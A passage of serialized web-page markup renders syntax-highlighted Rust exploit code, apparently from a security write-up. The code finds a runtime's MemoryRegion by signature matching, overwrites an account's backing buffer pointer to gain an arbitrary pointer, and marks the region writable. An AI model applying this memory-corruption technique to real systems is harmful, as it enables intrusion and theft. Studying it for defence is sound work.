token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement550\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement551\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement552\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}],[\"$\",\"span\",\"code-segement553\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement554\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement555\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement556\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"as_ptr\"]}],[\"$\",\"span\",\"code-segement557\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement558\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement559\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement560\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement561\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement562\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement563\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement564\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--61\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[61]}],\"\\n\",[\"$\",\"span\",\"line-number--62\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[62]}],[\"$\",\"span\",\"code-segement568\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement569\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"loop\"]}],[\"$\",\"span\",\"code-segement570\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement571\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement572\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--63\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[63]}],[\"$\",\"span\",\"code-segement574\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement575\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Signature matching to reliably identify MemoryRegion\"]}],[\"$\",\"span\",\"code-segement576\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--64\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[64]}],[\"$\",\"span\",\"code-segement578\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement579\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement580\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement581\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement582\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement583\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement584\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}],[\"$\",\"span\",\"code-segement585\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement586\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement587\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x18\"]}],[\"$\",\"span\",\"code-segement588\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement589\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement590\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement591\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement592\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement593\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement594\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement595\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement596\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement597\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement598\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement599\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement600\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x000000040020a238\"]}],[\"$\",\"span\",\"code-segement601\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement602\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}],[\"$\",\"span\",\"code-segement603\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--65\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[65]}],[\"$\",\"span\",\"code-segement605\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                   \"]}],[\"$\",\"span\",\"code-segement606\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement607\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement608\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement609\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}],[\"$\",\"span\",\"code-segement610\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement611\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement612\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x58\"]}],[\"$\",\"span\",\"code-segement613\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement614\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement615\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement616\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement617\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement618\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement619\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement620\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement621\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement622\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement623\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement624\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement625\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x0000000400202908\"]}],[\"$\",\"span\",\"code-segement626\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement627\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}],[\"$\",\"span\",\"code-segement628\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--66\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[66]}],[\"$\",\"span\",\"code-segement630\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                   \"]}],[\"$\",\"span\",\"code-segement631\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement632\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement633\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement634\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}],[\"$\",\"span\",\"code-segement635\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement636\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement637\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x98\"]}],[\"$\",\"span\",\"code-segement638\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement639\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement640\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement641\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement642\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement643\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement644\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement645\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement646\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement647\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement648\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement649\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement650\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x000000040020f308\"]}],[\"$\",\"span\",\"code-segement651\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement652\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}],[\"$\",\"span\",\"code-segement653\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--67\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[67]}],[\"$\",\"span\",\"code-segement655\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                   \"]}],[\"$\",\"span\",\"code-segement656\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement657\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement658\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement659\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}],[\"$\",\"span\",\"code-segement660\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement661\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement662\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0xd8\"]}],[\"$\",\"span\",\"code-segement663\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement664\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement665\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement666\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement667\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement668\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement669\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement670\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement671\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement672\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement673\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement674\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement675\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x0000000400000000\"]}],[\"$\",\"span\",\"code-segement676\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement677\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement678\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--68\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[68]}],\"\\n\",[\"$\",\"span\",\"line-number--69\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[69]}],[\"$\",\"span\",\"code-segement682\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement683\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement684\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" thread_mem \"]}],[\"$\",\"span\",\"code-segement685\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement686\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement687\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement688\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement689\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement690\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement691\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}],[\"$\",\"span\",\"code-segement692\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement693\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement694\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x48\"]}],[\"$\",\"span\",\"code-segement695\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement696\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement697\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement698\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement699\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement700\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"const\"]}],[\"$\",\"span\",\"code-segement701\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement702\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement703\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement704\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement705\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement706\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement707\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"21\"]}],[\"$\",\"span\",\"code-segement708\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement709\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement710\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segement711\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement712\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"21\"]}],[\"$\",\"span\",\"code-segement713\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement714\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--70\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[70]}],\"\\n\",[\"$\",\"span\",\"line-number--71\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[71]}],[\"$\",\"span\",\"code-segement718\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement719\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Overwrite POINTER account's backing buffer pointer (arb_ptr)\"]}],[\"$\",\"span\",\"code-segement720\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--72\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[72]}],[\"$\",\"span\",\"code-segement722\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement723\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement724\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement725\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement726\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}],[\"$\",\"span\",\"code-segement727\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement728\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement729\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x490\"]}],[\"$\",\"span\",\"code-segement730\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement731\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement732\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement733\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement734\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement735\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement736\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement737\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement738\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement739\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement740\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement741\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" thread_mem\"]}],[\"$\",\"span\",\"code-segement742\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement743\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--73\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[73]}],[\"$\",\"span\",\"code-segement745\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement746\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Set memory region state to writable\"]}],[\"$\",\"span\",\"code-segement747\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--74\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[74]}],[\"$\",\"span\",\"code-segement749\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement750\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement751\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement752\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement753\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data_ptr \"]}],[\"$\",\"span\",\"code-segement754\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement755\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement756\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x4b8\"]}],[\"$\",\"span\",\"code-segement757\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement758\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement759\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement760\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement761\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement762\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement763\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement764\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement765\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement766\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement767\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement768\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement769\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement770\",{\"className\":\"token 